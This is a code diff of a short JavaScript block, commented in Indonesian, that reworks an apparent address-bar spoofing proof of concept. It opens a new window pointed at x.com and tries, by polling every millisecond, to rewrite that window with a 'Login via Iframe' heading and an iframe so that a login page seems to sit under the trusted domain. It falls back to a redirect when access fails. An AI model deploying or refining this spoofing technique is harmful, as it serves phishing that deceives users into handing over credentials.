@@ -1,21 +1,37 @@
 <script>
   function next() {
     // Redirect ke halaman Google setelah pengalihan
-    window.location.replace('https://www.google.com:1234');
+    w.location.replace('https://www.google.com:1234');
   }
 
   function f() {
-    // Mengubah alamat URL di address bar ke x.com tanpa mereload halaman
-    window.location.href = "https://x.com";  // Alamat spoofed di address bar
+    // Membuka jendela baru
+    w = window.open("");
 
-    // Menampilkan iframe yang memuat login form (x.com atau lainnya)
-    document.body.innerHTML = '<h2>Login via Iframe</h2>';
-    document.body.innerHTML += '<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>';
+    // Menulis konten sementara dalam jendela baru
+    w.document.write('<h2>Login via Iframe</h2>');
+
+    // Menambahkan iframe yang memuat halaman login (x.com)
+    w.document.write('<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>');
+
+    // Mengubah lokasi jendela ke x.com
+    w.location = "https://x.com";
 
     // Mengecek kondisi dan redirect setelah pengalihan
-    setTimeout(function() {
-      next();  // Setelah beberapa detik, alihkan ke halaman Google
-    }, 5000); // Setelah 5 detik
+    i = setInterval(function() {
+      try {
+        // Mengecek apakah lokasi berhasil berubah ke x.com
+        if (w.location.href === "https://x.com") {
+          // Lanjutkan menampilkan iframe jika berada di x.com
+          w.document.body.innerHTML = '<h2>Login via Iframe</h2>';
+          w.document.body.innerHTML += '<iframe src="https://x.com" width="100%" height="500px" id="loginIframe"></iframe>';
+        }
+      } catch (e) {
+        // Jika gagal, hentikan interval dan alihkan ke halaman Google
+        clearInterval(i);
+        next();
+      }
+    }, 1); // Mengecek setiap 1ms
   }
 </script>
 
